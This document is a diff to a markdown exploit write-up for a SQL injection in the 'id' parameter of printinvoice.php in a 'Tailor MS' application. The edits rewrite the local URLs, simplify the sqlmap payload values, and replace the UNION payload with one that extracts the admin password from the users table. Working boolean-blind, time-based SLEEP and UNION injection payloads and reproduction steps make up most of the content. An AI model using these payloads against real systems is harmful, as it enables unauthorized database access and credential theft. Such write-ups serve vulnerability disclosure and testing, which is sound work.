@@ -1,4 +1,4 @@
-# Exploit Title: Tailor MS – SQL Injection in printinvoice.php (`http://localhost/tailor/printinvoice.php?id=1`)
+# Exploit Title: Tailor MS – SQL Injection in printinvoice.php (`http://localhost:8000/printinvoice.php?id=1`)
 
 **Date:** 2025-08-11  
 **Exploit Author:** Anonymous  
@@ -20,31 +20,31 @@ A SQL Injection vulnerability exists in the `printinvoice.php` endpoint of **Tai
 
 ### Affected Endpoint
 
-- **URL:** `http://localhost/tailor/printinvoice.php?id=1`
+- **URL:** `http://localhost:8000/printinvoice.php?id=1`
 - **HTTP Method:** GET
 - **Vulnerable File:** `printinvoice.php`
 - **Parameter:** `id`
 - **Vector Location:** GET
 
-### Injection Techniques (as identified by sqlmap)
+### Injection Techniques
 - **Type:** boolean-based blind
   - **Title:** AND boolean-based blind - WHERE or HAVING clause (subquery - comment)
-  - **Payload:** `id=1' AND 6143=(SELECT (CASE WHEN (6143=6143) THEN 6143 ELSE (SELECT 5117 UNION SELECT 1921) END))-- -`
+  - **Payload:** `id=1' AND 1234=(SELECT (CASE WHEN (1234=1234) THEN 1234 ELSE (SELECT 1111 UNION SELECT 2222) END))-- -`
 - **Type:** time-based blind
   - **Title:** MySQL >= 5.0.12 AND time-based blind (query SLEEP)
-  - **Payload:** `id=1' AND (SELECT 4224 FROM (SELECT(SLEEP(5)))rWLE)-- toRz`
-- **Type:** UNION query
-  - **Title:** Generic UNION query (NULL) - 10 columns
-  - **Payload:** 
-```
-id=1' UNION ALL SELECT NULL,NULL,CONCAT(0x7170766271,0x58654a4276784274716273646a4d665751456b414570477859754164596a77556e67704950567669,0x717a767a71),NULL,NULL,NULL,NULL,NULL,NULL,NULL-- -
-```
+  - **Payload:** `id=1' AND (SELECT 5555 FROM (SELECT(SLEEP(5)))abcd)-- efgh`
+- **Type:** UNION query (exfiltration)
+  - **Title:** UNION query to extract admin password
+  - **Payload:**  
+    ```
+    http://localhost:8000/printinvoice.php?id=-1' union select password,2,3,4,5,6,7,8,9,10 from users where username='admin'-- -
+    ```
 
 
 
-## Proof of Concept (Burp Repeater)
+## Proof of Concept (Firefox Screenshot)
 
-![burp-repeater-poc](poc.png)
+![exploit](exploit.png)
 
 ## SQLMap Summary
 
@@ -64,7 +64,7 @@ The vulnerable parameter is reflected into the SQL statement without proper vali
 
 ## Steps to Reproduce
 
-1. Browse to `http://localhost/tailor/printinvoice.php?id=1`.  
+1. Browse to `http://localhost:8000/printinvoice.php?id=1`.  
 2. Intercept the request and inject the provided payload(s) into parameter `printinvoice.php?&<param>=...`.  
 3. Observe conditional responses / time delays / injected row reflections per technique above.  
 4. Confirm DBMS fingerprinting and data extraction as permitted by the app’s DB privileges.
@@ -74,7 +74,6 @@ The vulnerable parameter is reflected into the SQL statement without proper vali
 ![vulnerable-code](code_snippet.png)
 
 
-References
-OWASP: SQL Injection Prevention Cheat Sheet
-
+References  
+OWASP: SQL Injection Prevention Cheat Sheet  
 CWE-89: SQL Injection
